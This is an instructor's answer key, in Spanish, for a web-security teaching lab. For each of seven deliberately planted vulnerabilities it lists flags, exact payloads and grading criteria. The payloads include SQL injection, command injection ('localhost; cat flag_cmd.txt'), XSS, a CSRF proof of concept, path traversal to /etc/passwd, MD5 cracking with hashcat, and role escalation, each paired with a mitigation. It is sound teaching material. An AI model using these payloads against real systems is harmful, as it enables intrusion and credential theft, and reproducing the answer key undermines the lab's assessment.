# Guía del Docente — Laboratorio de Seguridad Web

Documento de uso exclusivo del profesor. Contiene los payloads exactos, flags esperadas y criterios de evaluación para cada vulnerabilidad.

---

## Reinicio limpio de la base de datos

```bash
rm db.sqlite && npm start
```

---

## Vulnerabilidad 1 — SQL Injection

**Flag:** `FLAG{sql_1nj3ct10n}`
**Módulo:** Login (`/`) y Búsqueda (`/dashboard.html`)

### Detección con OWASP ZAP / Nikto
```bash
nikto -h http://localhost:3000
```
ZAP: Active Scan sobre `/login` y `/search` detectará SQLi automáticamente.

### Explotación manual — Bypass de login
1. En el campo **Usuario** ingresar: `' OR '1'='1' --`
2. En **Contraseña** cualquier valor.
3. La respuesta JSON incluirá `flag` y `debug` con la query ejecutada.

### Explotación manual — UNION SELECT en búsqueda
Con Burp Suite, interceptar `GET /search?q=test` y modificar:
```
GET /search?q=' UNION SELECT id, flag, flag, flag, flag FROM flags -- HTTP/1.1
```
Los resultados incluirán la flag de la tabla `flags`.

### Validación en el reporte del alumno
- Captura de la respuesta JSON con el campo `flag`.
- Captura de los resultados de búsqueda con la flag de la UNION.
- Mitigación esperada: uso de sentencias preparadas (`db.prepare('... WHERE username = ?').get(username, hash)`).

---

## Vulnerabilidad 2 — Inyección de Comandos

**Flag:** `FLAG{cmd_1nj3ct10n}` (contenida en `flag_cmd.txt` en el servidor)
**Módulo:** Panel Admin → Diagnóstico de red (`/admin.html`)

### Detección
Nikto detectará el endpoint. ZAP puede detectar OS Command Injection en active scan.

### Explotación manual
1. Iniciar sesión con cualquier cuenta (el endpoint no valida rol).
2. Navegar a `/admin.html` (o usar Burp para acceder directamente a `/admin/ping`).
3. En el campo **Host** ingresar:
   ```
   localhost; cat flag_cmd.txt
   ```
4. El output mostrará el resultado del ping Y el contenido de `flag_cmd.txt`.

### Variantes de payload
```bash
localhost; id
localhost; whoami
localhost && cat flag_cmd.txt
localhost | cat flag_cmd.txt
```

### Validación en el reporte del alumno
- Captura del output mostrando `FLAG{cmd_1nj3ct10n}` junto al resultado del ping.
- Mitigación esperada: validar que `host` solo contenga caracteres alfanuméricos y puntos; usar `execFile` en lugar de `exec`.

---

## Vulnerabilidad 3 — XSS (Stored + Reflected)

**Flag:** `FLAG{xss_st0r3d}` (obtenida llamando a `/api/xss-flag` mediante el payload)
**Módulo:** Mensajes (`/messages`)

### Detección
ZAP y Nikto detectarán XSS Reflected en el parámetro `?msg=`. ZAP detectará XSS Stored al enviar un mensaje con payload.

### Explotación — XSS Reflected
En el navegador, abrir:
```
http://localhost:3000/messages?msg=<script>alert(document.cookie)</script>
```
El script se ejecuta. La cookie de sesión es visible porque `httpOnly: false`.

### Explotación — XSS Stored + obtención de flag
1. En el tablero de mensajes, enviar como contenido:
   ```html
   <script>fetch('/api/xss-flag').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))</script>
   ```
2. Recargar `/messages`. El script se ejecuta y muestra la flag en un alert.
3. Alternativa para demostrar robo de sesión:
   ```html
   <script>fetch('/api/xss-flag').then(r=>r.json()).then(d=>{document.body.innerHTML='<h1 style="color:red">XSS ejecutado!</h1><p>'+d.flag+'</p>';});</script>
   ```

### Validación en el reporte del alumno
- Captura del alert con la flag o la cookie de sesión.
- Mitigación esperada: escapar HTML en el servidor antes de insertar en la respuesta (`he.escape()` o equivalente); CSP headers; `httpOnly: true` en la cookie.

---

## Vulnerabilidad 4 — CSRF

**Flag:** `FLAG{csrf_4tt4ck}`
**Módulo:** Actualización de perfil (`POST /profile/update`)

### Detección
ZAP detecta ausencia de token CSRF en formularios. Burp Suite → CSRF PoC Generator.

### Explotación manual
1. Iniciar sesión como `alumno_lopez` en el navegador.
2. Crear un archivo `csrf_poc.html` en cualquier directorio local:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
   <h1>Página de ataque CSRF</h1>
   <script>
     fetch('http://localhost:3000/profile/update', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       credentials: 'include',
       body: JSON.stringify({ password: 'hackeado123' })
     }).then(r => r.json()).then(d => {
       document.write('<h2>Respuesta del servidor:</h2><pre>' + JSON.stringify(d, null, 2) + '</pre>');
     });
   </script>
   </body>
   </html>
   ```
3. Abrir `csrf_poc.html` en el mismo navegador (otra pestaña). La cookie se envía automáticamente.
4. La respuesta incluye `csrf_flag: "FLAG{csrf_4tt4ck}"`.

### Validación en el reporte del alumno
- Captura de la respuesta con la flag.
- Mitigación esperada: implementar token CSRF (sincronizador o double-submit cookie); `SameSite: Strict` en la cookie.

---

## Vulnerabilidad 5 — Inclusión de Archivos (Path Traversal)

**Flag:** `FLAG{f1l3_1nclus10n}` (contenida en `secret_lfi.txt` en la raíz del proyecto)
**Módulo:** Descarga de material (`/download`)

### Detección
Nikto y ZAP detectan path traversal en parámetros de archivo.

### Explotación manual
En el campo de descarga del dashboard, ingresar:
```
../../secret_lfi.txt
```
O con Burp:
```
GET /download?file=../../secret_lfi.txt HTTP/1.1
```
La respuesta JSON incluye `content` con la flag y el campo `flag`.

### Variantes
```
../../flag_cmd.txt          → también funciona, revela flag de cmd injection
../../../etc/passwd         → funciona en Linux, muestra /etc/passwd
```

### Validación en el reporte del alumno
- Captura del JSON con el contenido de `secret_lfi.txt` y la flag.
- Mitigación esperada: usar `path.resolve()` y verificar que el resultado empiece con el directorio base; usar una lista blanca de archivos permitidos.

---

## Vulnerabilidad 6 — Exposición de Datos Sensibles

**Flag:** `FLAG{s3ns1t1v3_d4t4}` (retornada por `/api/users`)
**Módulo:** Múltiples superficies

### Superficies vulnerables

| Superficie | Cómo acceder |
|---|---|
| `/api/users` sin auth | `curl http://localhost:3000/api/users` |
| `db.sqlite` descargable | `curl -O http://localhost:3000/db.sqlite` |
| Comentario HTML con credenciales | Ver código fuente de `/admin.html` |
| Hashes MD5 débiles | Ver campo `password` en `/api/users` o en `db.sqlite` |

### Explotación manual — /api/users
```bash
curl http://localhost:3000/api/users | python3 -m json.tool
```
Retorna usuarios con hashes MD5 y la flag.

### Crackear hash MD5
```bash
echo -n "admin123" | md5sum
# O usar: https://crackstation.net (en ambiente offline: hashcat)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

### Explotación — db.sqlite
```bash
curl -O http://localhost:3000/db.sqlite
sqlite3 db.sqlite "SELECT username, password FROM usuarios;"
```

### Validación en el reporte del alumno
- Captura de `/api/users` con hashes expuestos y la flag.
- Captura del código fuente HTML con el comentario de credenciales.
- Mitigación esperada: autenticar y autorizar `/api/users`; no servir `db.sqlite` estáticamente; usar bcrypt en lugar de MD5; eliminar comentarios con información sensible.

---

## Vulnerabilidad 7 — Escalamiento de Privilegios Vertical

**Flag:** `FLAG{pr1v_3sc4l4t10n}`
**Módulo:** Actualización de perfil (`POST /profile/update`)

### Detección
Requiere validación manual: interceptar la petición de actualización de perfil con Burp y añadir el campo `rol`.

### Explotación manual con Burp Suite
1. Iniciar sesión como `alumno_lopez`.
2. En Burp, interceptar `POST /profile/update` desde el dashboard.
3. Modificar el body para incluir `rol`:
   ```json
   {"password": "alumno123", "rol": "admin"}
   ```
4. La respuesta incluye `flag: "FLAG{pr1v_3sc4l4t10n}"`.
5. Al recargar, el usuario ahora tiene rol `admin` y puede acceder a `/admin.html`.

### Explotación con curl
```bash
# 1. Login y guardar cookie
curl -c cookies.txt -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alumno_lopez","password":"alumno123"}'

# 2. Escalar privilegios
curl -b cookies.txt -X POST http://localhost:3000/profile/update \
  -H "Content-Type: application/json" \
  -d '{"rol":"admin"}'
```

### Validación en el reporte del alumno
- Captura de la respuesta con la flag.
- Captura de la sesión después del cambio (rol = admin).
- Mitigación esperada: el servidor debe ignorar el campo `rol` enviado por el cliente; los cambios de rol deben hacerse solo por un administrador autenticado en un endpoint separado.

---

## Criterios de evaluación sugeridos

| Criterio | Puntos |
|---|---|
| Identificación correcta de la vulnerabilidad (nombre OWASP) | 1 pt |
| Evidencia de explotación (flag obtenida + captura) | 2 pt |
| Descripción técnica del mecanismo vulnerable | 1 pt |
| Propuesta de mitigación técnica concreta | 2 pt |
| **Total por vulnerabilidad** | **6 pt** |
| **Total del proyecto (7 vulns)** | **42 pt** |
